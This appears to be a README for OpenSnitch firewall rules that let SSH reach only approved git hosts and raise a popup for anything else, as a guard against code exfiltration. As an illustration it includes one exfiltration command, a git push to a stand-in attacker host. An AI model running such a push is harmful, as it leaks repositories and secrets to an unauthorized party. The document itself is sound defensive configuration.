# SSH

Rules for SSH connections (`/usr/bin/ssh`).

## Security model

SSH is the primary vector for code exfiltration — `git push` to an
unauthorized remote can silently leak repos and secrets. The approach:

- **Permanent allows** only for approved git hosting providers
- **Everything else** triggers an OpenSnitch popup

This means:
- ✅ `git push origin main` (GitHub/GitLab/Azure DevOps) — works silently
- ⚠️ `ssh production-server` — popup, approve temporarily
- 🚨 `git push evil@attacker.com:secrets.git` — popup, visible to the user

## Rules

### 000 – Allow git providers

| Host | Purpose |
|---|---|
| `github.com` | GitHub repositories |
| `gitlab.com` | GitLab repositories |
| `ssh.dev.azure.com` | Azure DevOps repositories |

## Adding new providers

If the team starts using another git provider (e.g. Bitbucket), add it to
the regex in `ssh-000-allow-git-providers.json`. Don't add blanket SSH
access — the popup boundary is the security feature.
